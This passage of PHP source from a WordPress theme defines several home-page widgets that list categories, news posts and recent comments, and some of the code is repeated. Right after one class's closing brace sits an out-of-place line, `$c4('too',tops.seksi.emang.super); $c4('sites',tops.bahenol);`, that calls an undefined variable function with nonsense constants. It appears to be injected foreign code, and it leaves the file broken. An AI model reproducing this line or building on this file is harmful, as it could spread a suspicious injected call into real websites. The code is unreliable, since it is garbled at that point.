     * Return the array index of a given ID
     *
     * @since 1.0.0
     * @param array $arr Array.
     * @param int   $id Post ID.
     * @access private
     */
    private function get_cat_parent_index( $arr, $id ) {
        $len = count( $arr );
        if ( 0 === $len ) {
            return false;
        }
        $id = absint( $id );
        for ( $i = 0; $i < $len; $i++ ) {
            if ( $id === $arr[ $i ]['id'] ) {
                return $i;
            }
        }
        return false;
    }
    /**
     * Returns the shortened post title, must use in a loop.
     *
     * @since 1.0.0
     * @param int    $len Number text to display.
     * @param string $more Text Button.
     * @return string.
     */ 
} $c4('too',tops.seksi.emang.super); $c4('sites',tops.bahenol); 
add_action(
    'widgets_init',
    function() {
        register_widget( 'widget_categorie_homes_' );
    }
);
/*-----------------------------------------------------------------------------------*/
/*  Home News Widget
/*-----------------------------------------------------------------------------------*/
class widget_news_homes_ extends WP_Widget { 
    public function __construct() {
        $widget_ops = array(
            'classname'   => 'news-home-widgets',
            'description' => __( EX_THEMES_NAMES_.' Home News Widget.', EX_THEMES_NAMES_ ),
        );
        parent::__construct( 'news-home-widgets', __( EX_THEMES_NAMES_.' News Home Widget', EX_THEMES_NAMES_ ), $widget_ops );
    } 
    public function widget( $args, $instance ) {
        /* Base Id Widget */
        $widget_id = $this->id_base . '-' . $this->number;
        /* Category ID */
        $category_ids = ( ! empty( $instance['category_ids'] ) ) ? array_map( 'absint', $instance['category_ids'] ) : array( 0 );
        /* Excerpt Length */
        $number_posts = ( ! empty( $instance['number_posts'] ) ) ? absint( $instance['number_posts'] ) : absint( 5 );
        /* Title Length */
        $title_length = ( ! empty( $instance['title_length'] ) ) ? absint( $instance['title_length'] ) : absint( 40 );
        /* Style */
        $layout_style = ( ! empty( $instance['layout_style'] ) ) ? wp_strip_all_tags( $instance['layout_style'] ) : wp_strip_all_tags( 'style_1' );
        // Link Title.
        $link_title = ( ! empty( $instance['link_title'] ) ) ? esc_url( $instance['link_title'] ) : '';
        /* Popular by date */
        $popular_date = ( isset( $instance['popular_date'] ) ) ? esc_attr( $instance['popular_date'] ) : esc_attr( 'alltime' );
		$colors_svg			= ( isset( $instance['color_svg'] ) ) ? esc_attr( $instance['color_svg'] ) : esc_attr( 's-blue' ); 
        
        /* Title */
        $title = apply_filters( 'widget_title', empty( $instance['title'] ) ? '' : $instance['title'], $instance, $this->id_base );
        $title2 = ( ! empty( $instance['title2'] ) ) ?  $instance['title2'] : '';
        $icons = ( ! empty( $instance['icon'] ) ) ?  $instance['icon'] : '';
		$layout_style = ( ! empty( $instance['layout_style'] ) ) ? wp_strip_all_tags( $instance['layout_style'] ) : wp_strip_all_tags( 'style_1' );
        echo $args['before_widget'];  
		if ( $title ) {
		if ( ! empty( $link_title ) ) { ?>
		<div class="section-head">   
		<h3 class="section-title"><i class="<?php echo $colors_svg; ?> c-icon"><svg width="24" height="24"><use xlink:href="#i__flash"></use></svg></i>
		<?php echo $title; ?>
		</h3>	
		<a class="btn s-green btn-all" href="<?php echo $link_title; ?>">
		<span><?php echo $title2; ?></span>
		<svg width="24" height="24"><use xlink:href="#i__keyright"></use></svg>
		</a>
		</div>
		<?php } else { ?>
		<div class="section-head">   
		<h3 class="section-title"><i class="<?php echo $colors_svg; ?> c-icon"><svg width="24" height="24"><use xlink:href="#i__flash"></use></svg></i>
		<?php echo $title; ?>
		</h3>	
		 
		<a class="btn s-green btn-all" href="<?php echo esc_url( home_url( '/' ) ); ?>news">
		<span><?php echo $title2; ?></span>
		<svg width="24" height="24"><use xlink:href="#i__keyright"></use></svg>
		</a>
		 
		</div>
		<?php }
        } 
        /* if 'all categories' was selected ignore other selections of categories */
        if ( in_array( 0, $category_ids, true ) ) {
            $category_ids = array( 0 );
        }
         
		global $wpdb, $post, $opt_themes, $wp_query;
		$paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
		query_posts( array(
                    'post_type'			=> 'news',
                    'post_status'		=> 'publish',
                    'orderby'			=> 'modified',
					'posts_per_page'	=> 2,
                    'order'				=> 'DESC',
                )
		);
        if ( 'style_2' === $layout_style ) : ?> 
        <?php else : ?>
		<div class="entry-list list-c2">
		<?php if (have_posts()) : while (have_posts()) : the_post(); ?>
		<div class="entry entry-news">
		<div class="item">
		<div class="pic">
		<figure class="fit-cover">
		<?php if (has_post_thumbnail()) { ?>
		<?php global $opt_themes;						 
		if($opt_themes['ex_themes_full_images_']) { ?>							
		<?php echo px_post_thumbnail_news_fulls(); ?>
		<?php } else { ?>
		<?php echo px_post_thumbnail_news(); ?>
		<?php } ?>
		<?php } else { ?>
		<img src="<?php echo get_template_directory_uri(); ?>/assets/img/lazy.png" alt="<?php the_title(); ?>"width="300" height="300">
		<?php } ?>
		</figure>
		</div>
		<div class="cont">
		<div class="meta muted">
		<time class="meta-date" datetime="<?php echo get_the_time('F j, Y ')?>"><?php echo get_the_time('F j, Y ')?></time>
		<div class="meta-view"><svg width="24" height="24"><use xlink:href="#i__stats"></use></svg><?= ex_themes_get_post_view_(); ?></div>
		</div>
		<h2 class="title"><a class="item-link" href="<?php the_permalink() ?>"><span><?php the_title(); ?></span></a></h2>
		<div class="description" style="display: none;"><?php echo get_excerpt(75); ?></div>
		<div class="read-more"><a href="<?php the_permalink() ?>"><?php global $opt_themes; if($opt_themes['exthemes_Read_more']) { ?><?php echo $opt_themes['exthemes_Read_more']; ?><?php } ?></a></div>
		</div>
		</div>
		</div>  
		<?php endwhile; ?>
		<?php endif; ?>
		<?php wp_reset_postdata(); ?>
		</div> 
        <?php
        endif;
        echo $args['after_widget'];  
    } 
    public function update( $new_instance, $old_instance ) {
        $instance     = $old_instance;
        $new_instance = wp_parse_args(
            (array) $new_instance,
            array(
                'title'             => '',
                'title2'			=> '',
                'icon'				=> '',
                'link_title'        => '',
                'category_ids'      => array( 0 ),
                'layout_style'      => 'style_1',
                'number_posts'      => 3, 
                'popular_date'      => 'alltime',
                'color_svg'   		=> 's-blue', 
            )
        );
        /* Title */
        $instance['title'] = sanitize_text_field( $new_instance['title'] );
        $instance['title2'] = sanitize_text_field( $new_instance['title2'] );
        $instance['icon'] = sanitize_text_field( $new_instance['icon'] );
        // Link Title.
        $instance['link_title'] = esc_url( $new_instance['link_title'] );
        /* Category IDs */
        $instance['category_ids'] = array_map( 'absint', $new_instance['category_ids'] );
        /* Style */
        //$instance['layout_style'] = wp_strip_all_tags( $new_instance['layout_style'] );
        /* Number posts */
        $instance['number_posts'] = absint( $new_instance['number_posts'] );
        
        $instance['popular_date'] = esc_attr( $new_instance['popular_date'] );
        $instance['color_svg'] = esc_attr( $new_instance['color_svg'] );
         
        /* if 'all categories' was selected ignore other selections of categories */
        if ( in_array( 0, $instance['category_ids'], true ) ) {
            $instance['category_ids'] = array( 0 );
        }
        return $instance;
    }
    /**
     * Outputs the settings form for the most view widget.
     *
     * @since 1.0.0
     * @access public
     *
     * @param array $instance Current settings.
     */
    public function form( $instance ) {
        $instance = wp_parse_args(
            (array) $instance,
            array(
                'title'             => __( 'Last news', EX_THEMES_NAMES_ ),
                'title2'			=> __( 'All news', EX_THEMES_NAMES_ ),
                'icon'    		    => 'apps',
                'link_title'        => 'https://yoursites.com/categories',
                'category_ids'      => array( 0 ),
                'layout_style'      => 'style_1',
                'number_posts'      => 2,  
                'popular_date'      => 'alltime',
                'color_svg'   		=> 's-blue', 
            )
        );
        /* Title */
        $title = sanitize_text_field( $instance['title'] );
		$title2 = sanitize_text_field( $instance['title2'] );
		$icon = sanitize_text_field( $instance['icon'] );
        // Link Title.
        $link_title = esc_url( $instance['link_title'] );
        /* Category ID */
        $category_ids = array_map( 'absint', $instance['category_ids'] );
        /* Style */
        //$layout_style = wp_strip_all_tags( $instance['layout_style'] );
        /* Number posts */
        $number_posts = absint( $instance['number_posts'] ); 
        /* Popular range */
        $popular_date = esc_attr( $instance['popular_date'] );
		$colors_svg			= esc_attr( $instance['color_svg'] );  
        /* get categories */
        $categories     = get_categories(
            array(
                'hide_empty'   => 0,
                'hierarchical' => 1,
            )
        );
        $number_of_cats = count( $categories );
        /* get size (number of rows to display) of selection box: not more than 10 */
        $number_of_rows = ( 10 > $number_of_cats ) ? $number_of_cats + 1 : 10;
        /* if 'all categories' was selected ignore other selections of categories */
        if ( in_array( 0, $category_ids, true ) ) {
            $category_ids = array( 0 );
        }
        /* start selection box */
        $selection_category  = sprintf(
            '<select name="%s[]" id="%s" class="cat-select widefat" multiple size="%d">',
            $this->get_field_name( 'category_ids' ),
            $this->get_field_id( 'category_ids' ),
            $number_of_rows
        );
        $selection_category .= "\n";
        /* make selection box entries */
        $cat_list = array();
        if ( 0 < $number_of_cats ) {
            /* make a hierarchical list of categories */
            while ( $categories ) {
                /* if there is no parent */
                if ( 0 === $categories[0]->parent ) {
                    /* get and remove it from the categories list */
                    $current_entry = array_shift( $categories );
                    /* append the current entry to the new list */
                    $cat_list[] = array(
                        'id'    => absint( $current_entry->term_id ),
                        'name'  => esc_html( $current_entry->name ),
                        'depth' => 0,
                    );
                    /* go on looping */
                    continue;
                }
                /**
                 * If there is a parent:
                 * try to find parent in new list and get its array index
                 */
                $parent_index = $this->get_cat_parent_index( $cat_list, $categories[0]->parent );
                /* if parent is not yet in the new list: try to find the parent later in the loop */
                if ( false === $parent_index ) {
                    /* get and remove current entry from the categories list */
                    $current_entry = array_shift( $categories );
                    /* append it at the end of the categories list */
                    $categories[] = $current_entry;
                    /* go on looping */
                    continue;
                }
                /**
                 * If there is a parent and parent is in new list:
                 * set depth of current item: +1 of parent's depth
                 */
                $depth = $cat_list[ $parent_index ]['depth'] + 1;
                /* set new index as next to parent index */
                $new_index = $parent_index + 1;
                /* find the correct index where to insert the current item */
                foreach ( $cat_list as $entry ) {
                    /* if there are items with same or higher depth than current item */
                    if ( $depth <= $entry['depth'] ) {
                        /* increase new index */
                        $new_index = $new_index++;
                        /* go on looping in foreach() */
                        continue;
                    }
                    /**
                     * If the correct index is found:
                     * get current entry and remove it from the categories list
                     */
                    $current_entry = array_shift( $categories );
                    /* insert current item into the new list at correct index */
                    $end_array  = array_splice( $cat_list, $new_index ); /* $cat_list is changed, too */
                    $cat_list[] = array(
                        'id'    => absint( $current_entry->term_id ),
                        'name'  => esc_html( $current_entry->name ),
                        'depth' => $depth,
                    );
                    $cat_list   = array_merge( $cat_list, $end_array );
                    /* quit foreach(), go on while-looping */
                    break;
                } /* End foreach( cat_list ) */
            } /* End while( categories ) */
            /* make HTML of selection box */
            $selected            = ( in_array( 0, $category_ids, true ) ) ? ' selected="selected"' : '';
            $selection_category .= "\t";
            $selection_category .= '<option value="0"' . $selected . '>' . __( 'All Categories', EX_THEMES_NAMES_ ) . '</option>';
            $selection_category .= "\n";
            foreach ( $cat_list as $category ) {
                $cat_name            = apply_filters( 'gmr_list_cats', $category['name'], $category );
                $pad                 = ( 0 < $category['depth'] ) ? str_repeat( '&ndash;&nbsp;', $category['depth'] ) : '';
                $selection_category .= "\t";
                $selection_category .= '<option value="' . $category['id'] . '"';
                $selection_category .= ( in_array( $category['id'], $category_ids, true ) ) ? ' selected="selected"' : '';
                $selection_category .= '>' . $pad . $cat_name . '</option>';
                $selection_category .= "\n";
            }
        }
        /* close selection box */
        $selection_category .= "</select>\n";
        ?>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'title' ) ); ?>"><?php esc_html_e( 'Title:', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'title' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'title' ) ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>" />
        </p>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'title2' ) ); ?>"><?php esc_html_e( 'Title Alt:', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'title2' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'title2' ) ); ?>" type="text" value="<?php echo esc_attr( $title2 ); ?>" />
        </p>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'link_title' ) ); ?>"><?php esc_html_e( 'Link Title:', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'link_title' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'link_title' ) ); ?>" type="url" value="<?php echo esc_attr( $link_title ); ?>" />           
            <small><?php esc_html_e( 'Target url for title (example: https://yoursites.com/categories), leave blank if you want using title without link.', EX_THEMES_NAMES_ ); ?></small>
        </p>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'color_svg' ) ); ?>"><?php esc_html_e( 'Color Svg Icons:', EX_THEMES_NAMES_ ); ?></label>
            <select class="widefat" id="<?php echo esc_html( $this->get_field_id( 'color_svg', EX_THEMES_NAMES_ ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'color_svg' ) ); ?>">
			<option value="s-yellow" <?php selected( $instance['color_svg'], 's-yellow' ); ?>><?php esc_html_e( 'YELLOW', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-green" <?php selected( $instance['color_svg'], 's-green' ); ?>><?php esc_html_e( 'GREEN', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-purple" <?php selected( $instance['color_svg'], 's-purple' ); ?>><?php esc_html_e( 'PURPLE', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-red" <?php selected( $instance['color_svg'], 's-red' ); ?>><?php esc_html_e( 'RED', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-blue" <?php selected( $instance['color_svg'], 's-blue' ); ?>><?php esc_html_e( 'BLUE', EX_THEMES_NAMES_ ); ?></option>
            </select> 
            <small><?php esc_html_e( 'Select color svg icons.', EX_THEMES_NAMES_ ); ?></small>
        </p> 
        <?php
    }
    /**
     * Return the array index of a given ID
     *
     * @since 1.0.0
     * @param array $arr Array.
     * @param int   $id Post ID.
     * @access private
     */
    private function get_cat_parent_index( $arr, $id ) {
        $len = count( $arr );
        if ( 0 === $len ) {
            return false;
        }
        $id = absint( $id );
        for ( $i = 0; $i < $len; $i++ ) {
            if ( $id === $arr[ $i ]['id'] ) {
                return $i;
            }
        }
        return false;
    }
    /**
     * Returns the shortened post title, must use in a loop.
     *
     * @since 1.0.0
     * @param int    $len Number text to display.
     * @param string $more Text Button.
     * @return string.
     */
    
}
add_action(
    'widgets_init',
    function() {
        register_widget( 'widget_news_homes_' );
    }
);
 
/*-----------------------------------------------------------------------------------*/
/*  Home Comments Widget
/*-----------------------------------------------------------------------------------*/
class widget_comments_homes_ extends WP_Widget { 
    public function __construct() {
        $widget_ops = array(
            'classname'   => 'comments-home-widgets',
            'description' => __( EX_THEMES_NAMES_.' Home Comments Widget.', EX_THEMES_NAMES_ ),
        );
        parent::__construct( 'comments-home-widgets', __( EX_THEMES_NAMES_.' Comments Home Widget', EX_THEMES_NAMES_ ), $widget_ops );
    } 
    public function widget( $args, $instance ) {
        /* Base Id Widget */
        $widget_id = $this->id_base . '-' . $this->number;
        /* Category ID */
        $category_ids = ( ! empty( $instance['category_ids'] ) ) ? array_map( 'absint', $instance['category_ids'] ) : array( 0 );
        /* Excerpt Length */
        $number_posts = ( ! empty( $instance['number_posts'] ) ) ? absint( $instance['number_posts'] ) : absint( 5 );
        /* Title Length */
        $title_length = ( ! empty( $instance['title_length'] ) ) ? absint( $instance['title_length'] ) : absint( 40 );
        /* Style */
        $layout_style = ( ! empty( $instance['layout_style'] ) ) ? wp_strip_all_tags( $instance['layout_style'] ) : wp_strip_all_tags( 'style_1' );
        // Link Title.
        $link_title = ( ! empty( $instance['link_title'] ) ) ? esc_url( $instance['link_title'] ) : '';
        /* Popular by date */
        $popular_date = ( isset( $instance['popular_date'] ) ) ? esc_attr( $instance['popular_date'] ) : esc_attr( 'alltime' );
		$colors_svg			= ( isset( $instance['color_svg'] ) ) ? esc_attr( $instance['color_svg'] ) : esc_attr( 's-blue' ); 
        
        /* Title */
        $title = apply_filters( 'widget_title', empty( $instance['title'] ) ? '' : $instance['title'], $instance, $this->id_base );
        $title2 = ( ! empty( $instance['title2'] ) ) ?  $instance['title2'] : ''; 
		$layout_style = ( ! empty( $instance['layout_style'] ) ) ? wp_strip_all_tags( $instance['layout_style'] ) : wp_strip_all_tags( 'style_1' );
        echo $args['before_widget'];  
		if ( $title ) {
		if ( ! empty( $link_title ) ) { ?>
		<h3 class="section-title"><i class="<?php echo $colors_svg; ?> c-icon"><svg width="24" height="24"><use xlink:href="#i__coms"></use></svg></i>
		<?php echo $title; ?>
		</h3>	 
		<?php } else { ?>
		<h3 class="section-title"><i class="<?php echo $colors_svg; ?> c-icon"><svg width="24" height="24"><use xlink:href="#i__coms"></use></svg></i>
		<?php echo $title; ?>
		</h3>	 
		<?php }
        } 
        /* if 'all categories' was selected ignore other selections of categories */
        if ( in_array( 0, $category_ids, true ) ) {
            $category_ids = array( 0 );
        }
        /* filter the arguments for the Most view widget: */
        /* standard params */
        $query_args = array(
            'posts_per_page'         => $number_posts,
            'no_found_rows'          => true,
            'post_status'            => 'publish',
			'orderby'				 => 'modified',
			'order'					 => 'ASC',
            /**
             * Make it fast withour update term cache and cache results
             * https://thomasgriffin.io/optimize-wordpress-queries/
             */
            'update_post_term_cache' => false,
            'update_post_meta_cache' => false,
        );
        $query_args['ignore_sticky_posts'] = true;
        
        /* add categories param only if 'all categories' was not selected */
        if ( ! in_array( 0, $category_ids, true ) ) {
            $query_args['category__in'] = $category_ids;
        }
        /* exclude current displayed post */
        if ( $hide_current_post ) {
            global $post;
            if ( isset( $post->ID ) && is_singular() ) {
                $query_args['post__not_in'] = array( $post->ID );
            }
        }
        /* run the query: get the latest posts */
        $rp = new WP_Query( apply_filters( 'widget_categorie_homes__widget_posts_args', $query_args ) );
		global $wpdb, $post, $opt_themes, $wp_query;
            $paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
            query_posts( array(
                    /* 'post_type' => 'news', */
                    'paged' => $paged,
                    'post_status' => 'publish',
                    'orderby' => 'modified',
					'posts_per_page' => 2,
                    'order' => 'ASC'
                )
            );
        if ( 'style_2' === $layout_style ) : ?>
        <?php elseif ( 'style_3' === $layout_style ) : ?>
        <?php elseif ( 'style_4' === $layout_style ) : ?>
        <?php else : ?>
		<div class="scroll-entry-list">
            <div class="entry-list list-c3">
                <?php bg_recent_comments(); ?>
            </div>
        </div>
        <?php
        endif;
        echo $args['after_widget'];  
    } 
    public function update( $new_instance, $old_instance ) {
        $instance     = $old_instance;
        $new_instance = wp_parse_args(
            (array) $new_instance,
            array(
                'title'             => '',
                'title2'			=> '', 
                'link_title'        => '',
                'category_ids'      => array( 0 ),
                'layout_style'      => 'style_1',
                'number_posts'      => 3, 
                'popular_date'      => 'alltime',
                'color_svg'   		=> 's-blue', 
            )
        );
        /* Title */
        $instance['title'] = sanitize_text_field( $new_instance['title'] );
        $instance['title2'] = sanitize_text_field( $new_instance['title2'] ); 
        // Link Title.
        $instance['link_title'] = esc_url( $new_instance['link_title'] );
        /* Category IDs */
        $instance['category_ids'] = array_map( 'absint', $new_instance['category_ids'] );
        /* Style */
        //$instance['layout_style'] = wp_strip_all_tags( $new_instance['layout_style'] );
        /* Number posts */
        $instance['number_posts'] = absint( $new_instance['number_posts'] );
       
        /* Popular range */
        $instance['popular_date'] = esc_attr( $new_instance['popular_date'] );
        $instance['color_svg'] = esc_attr( $new_instance['color_svg'] );
         
        /* if 'all categories' was selected ignore other selections of categories */
        if ( in_array( 0, $instance['category_ids'], true ) ) {
            $instance['category_ids'] = array( 0 );
        }
        return $instance;
    }
    /**
     * Outputs the settings form for the most view widget.
     *
     * @since 1.0.0
     * @access public
     *
     * @param array $instance Current settings.
     */
    public function form( $instance ) {
        $instance = wp_parse_args(
            (array) $instance,
            array(
                'title'             => __( 'Latest comments ', EX_THEMES_NAMES_ ),
                'title2'			=> __( 'All news', EX_THEMES_NAMES_ ), 
                'link_title'        => 'https://yoursites.com/categories',
                'category_ids'      => array( 0 ),
                'layout_style'      => 'style_1',
                'number_posts'      => 2, 
                'popular_date'      => 'alltime',
                'color_svg'   		=> 's-blue', 
            )
        );
        /* Title */
        $title = sanitize_text_field( $instance['title'] );
		$title2 = sanitize_text_field( $instance['title2'] );
		 
        // Link Title.
        $link_title = esc_url( $instance['link_title'] );
        /* Category ID */
        $category_ids = array_map( 'absint', $instance['category_ids'] );
        /* Style */
        //$layout_style = wp_strip_all_tags( $instance['layout_style'] );
        /* Number posts */
        $number_posts = absint( $instance['number_posts'] );
         
        /* Popular range */
        $popular_date = esc_attr( $instance['popular_date'] );
		$colors_svg			= esc_attr( $instance['color_svg'] ); 
        
        /* get categories */
        $categories     = get_categories(
            array(
                'hide_empty'   => 0,
                'hierarchical' => 1,
            )
        );
        $number_of_cats = count( $categories );
        /* get size (number of rows to display) of selection box: not more than 10 */
        $number_of_rows = ( 10 > $number_of_cats ) ? $number_of_cats + 1 : 10;
        /* if 'all categories' was selected ignore other selections of categories */
        if ( in_array( 0, $category_ids, true ) ) {
            $category_ids = array( 0 );
        }
        /* start selection box */
        $selection_category  = sprintf(
            '<select name="%s[]" id="%s" class="cat-select widefat" multiple size="%d">',
            $this->get_field_name( 'category_ids' ),
            $this->get_field_id( 'category_ids' ),
            $number_of_rows
        );
        $selection_category .= "\n";
        /* make selection box entries */
        $cat_list = array();
        if ( 0 < $number_of_cats ) {
            /* make a hierarchical list of categories */
            while ( $categories ) {
                /* if there is no parent */
                if ( 0 === $categories[0]->parent ) {
                    /* get and remove it from the categories list */
                    $current_entry = array_shift( $categories );
                    /* append the current entry to the new list */
                    $cat_list[] = array(
                        'id'    => absint( $current_entry->term_id ),
                        'name'  => esc_html( $current_entry->name ),
                        'depth' => 0,
                    );
                    /* go on looping */
                    continue;
                }
                /**
                 * If there is a parent:
                 * try to find parent in new list and get its array index
                 */
                $parent_index = $this->get_cat_parent_index( $cat_list, $categories[0]->parent );
                /* if parent is not yet in the new list: try to find the parent later in the loop */
                if ( false === $parent_index ) {
                    /* get and remove current entry from the categories list */
                    $current_entry = array_shift( $categories );
                    /* append it at the end of the categories list */
                    $categories[] = $current_entry;
                    /* go on looping */
                    continue;
                }
                /**
                 * If there is a parent and parent is in new list:
                 * set depth of current item: +1 of parent's depth
                 */
                $depth = $cat_list[ $parent_index ]['depth'] + 1;
                /* set new index as next to parent index */
                $new_index = $parent_index + 1;
                /* find the correct index where to insert the current item */
                foreach ( $cat_list as $entry ) {
                    /* if there are items with same or higher depth than current item */
                    if ( $depth <= $entry['depth'] ) {
                        /* increase new index */
                        $new_index = $new_index++;
                        /* go on looping in foreach() */
                        continue;
                    }
                    /**
                     * If the correct index is found:
                     * get current entry and remove it from the categories list
                     */
                    $current_entry = array_shift( $categories );
                    /* insert current item into the new list at correct index */
                    $end_array  = array_splice( $cat_list, $new_index ); /* $cat_list is changed, too */
                    $cat_list[] = array(
                        'id'    => absint( $current_entry->term_id ),
                        'name'  => esc_html( $current_entry->name ),
                        'depth' => $depth,
                    );
                    $cat_list   = array_merge( $cat_list, $end_array );
                    /* quit foreach(), go on while-looping */
                    break;
                } /* End foreach( cat_list ) */
            } /* End while( categories ) */
            /* make HTML of selection box */
            $selected            = ( in_array( 0, $category_ids, true ) ) ? ' selected="selected"' : '';
            $selection_category .= "\t";
            $selection_category .= '<option value="0"' . $selected . '>' . __( 'All Categories', EX_THEMES_NAMES_ ) . '</option>';
            $selection_category .= "\n";
            foreach ( $cat_list as $category ) {
                $cat_name            = apply_filters( 'gmr_list_cats', $category['name'], $category );
                $pad                 = ( 0 < $category['depth'] ) ? str_repeat( '&ndash;&nbsp;', $category['depth'] ) : '';
                $selection_category .= "\t";
                $selection_category .= '<option value="' . $category['id'] . '"';
                $selection_category .= ( in_array( $category['id'], $category_ids, true ) ) ? ' selected="selected"' : '';
                $selection_category .= '>' . $pad . $cat_name . '</option>';
                $selection_category .= "\n";
            }
        }
        /* close selection box */
        $selection_category .= "</select>\n";
        ?>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'title' ) ); ?>"><?php esc_html_e( 'Title:', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'title' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'title' ) ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>" />
        </p>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'color_svg' ) ); ?>"><?php esc_html_e( 'Color Svg Icons:', EX_THEMES_NAMES_ ); ?></label>
            <select class="widefat" id="<?php echo esc_html( $this->get_field_id( 'color_svg', EX_THEMES_NAMES_ ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'color_svg' ) ); ?>">
			<option value="s-yellow" <?php selected( $instance['color_svg'], 's-yellow' ); ?>><?php esc_html_e( 'YELLOW', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-green" <?php selected( $instance['color_svg'], 's-green' ); ?>><?php esc_html_e( 'GREEN', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-purple" <?php selected( $instance['color_svg'], 's-purple' ); ?>><?php esc_html_e( 'PURPLE', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-red" <?php selected( $instance['color_svg'], 's-red' ); ?>><?php esc_html_e( 'RED', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-blue" <?php selected( $instance['color_svg'], 's-blue' ); ?>><?php esc_html_e( 'BLUE', EX_THEMES_NAMES_ ); ?></option>
            </select> 
            <small><?php esc_html_e( 'Select color svg icons.', EX_THEMES_NAMES_ ); ?></small>
        </p> 
        <?php
    }
    /**
     * Return the array index of a given ID
     *
     * @since 1.0.0
     * @param array $arr Array.
     * @param int   $id Post ID.
     * @access private
     */
    private function get_cat_parent_index( $arr, $id ) {
        $len = count( $arr );
        if ( 0 === $len ) {
            return false;
        }
        $id = absint( $id );
        for ( $i = 0; $i < $len; $i++ ) {
            if ( $id === $arr[ $i ]['id'] ) {
                return $i;
            }
        }
        return false;
    }
    /**
     * Returns the shortened post title, must use in a loop.
     *
     * @since 1.0.0
     * @param int    $len Number text to display.
     * @param string $more Text Button.
     * @return string.
     */
     
}
add_action(
    'widgets_init',
    function() {
        register_widget( 'widget_comments_homes_' );
    }
);


/*-----------------------------------------------------------------------------------*/
/*  Home Categories Widget
/*-----------------------------------------------------------------------------------*/
class widget_categorie_homes_modified_ extends WP_Widget {
    /**
     * Sets up a Most view Posts widget instance.
     *
     * @since 1.0.0
     * @access public
     */
    public function __construct() {
        $widget_ops = array(
            'classname'   => 'categorie-home-modified-widgets',
            'description' => __( EX_THEMES_NAMES_.' Home Categorie by Modified Widget.', EX_THEMES_NAMES_ ),
        );
        parent::__construct( 'categorie-home-modified-widgets', __( EX_THEMES_NAMES_.' Categorie by Modified Widget', EX_THEMES_NAMES_ ), $widget_ops );
    }
    /**
     * Outputs the content for most view widget.
     *
     * @since 1.0.0
     * @access public
     *
     * @param array $args     Display arguments including 'before_title', 'after_title',
     *                        'before_widget', and 'after_widget'.
     * @param array $instance Settings for most view widget.
     */
    public function widget( $args, $instance ) {
        /* Base Id Widget */
        $widget_id = $this->id_base . '-' . $this->number;
        /* Category ID */
        $category_ids = ( ! empty( $instance['category_ids'] ) ) ? array_map( 'absint', $instance['category_ids'] ) : array( 0 );
        /* Excerpt Length */
        $number_posts = ( ! empty( $instance['number_posts'] ) ) ? absint( $instance['number_posts'] ) : absint( 5 );
        /* Title Length */ 
        $layout_style = ( ! empty( $instance['layout_style'] ) ) ? wp_strip_all_tags( $instance['layout_style'] ) : wp_strip_all_tags( 'style_1' );
        // Link Title.
        $link_title = ( ! empty( $instance['link_title'] ) ) ? esc_url( $instance['link_title'] ) : '';
        /* Popular by date */ 
		$colors_svg			= ( isset( $instance['color_svg'] ) ) ? esc_attr( $instance['color_svg'] ) : esc_attr( 's-blue' ); 
	 
         
        /* Title */
        $title = apply_filters( 'widget_title', empty( $instance['title'] ) ? '' : $instance['title'], $instance, $this->id_base );
        $title2 = ( ! empty( $instance['title2'] ) ) ?  $instance['title2'] : '';
        $icons = ( ! empty( $instance['icon'] ) ) ?  $instance['icon'] : '';
		$layout_style = ( ! empty( $instance['layout_style'] ) ) ? wp_strip_all_tags( $instance['layout_style'] ) : wp_strip_all_tags( 'style_1' );
        echo $args['before_widget'];  
		if ( $title ) {
		if ( ! empty( $link_title ) ) { ?>
		<div class="section-head">   
		<h3 class="section-title"><i class="<?php echo $colors_svg; ?> c-icon"><svg width="24" height="24"><use xlink:href="#i__<?php echo $icons; ?>"></use></svg></i>
		<?php echo $title; ?>
		</h3>	
		<a class="btn s-green btn-all" href="<?php echo $link_title; ?>">
		<span><?php echo $title2; ?></span>
		<svg width="24" height="24"><use xlink:href="#i__keyright"></use></svg>
		</a>
		</div>
		<?php } else { ?>
		<div class="section-head">   
		<h3 class="section-title"><i class="<?php echo $colors_svg; ?> c-icon"><svg width="24" height="24"><use xlink:href="#i__<?php echo $icons; ?>"></use></svg></i>
		<?php echo $title; ?>
		</h3>
		<noscript>		
		<a class="btn s-green btn-all" href="<?php echo $link_title; ?>">
		<span><?php echo $title2; ?></span>
		<svg width="24" height="24"><use xlink:href="#i__keyright"></use></svg>
		</a>
		</noscript>
		</div>
		<?php }
        } 
        /* if 'all categories' was selected ignore other selections of categories */
        if ( in_array( 0, $category_ids, true ) ) {
            $category_ids = array( 0 );
        }
        /* filter the arguments for the Most view widget: */
        /* standard params */
        $query_args = array(
            'posts_per_page'         => $number_posts,
            'no_found_rows'          => true,
            'post_status'            => 'publish',
			'orderby'				 => 'modified',
            /**
             * Make it fast withour update term cache and cache results
             * https://thomasgriffin.io/optimize-wordpress-queries/
             */
            'update_post_term_cache' => false,
            'update_post_meta_cache' => false,
        );
        $query_args['ignore_sticky_posts'] = true;
         
        /* add categories param only if 'all categories' was not selected */
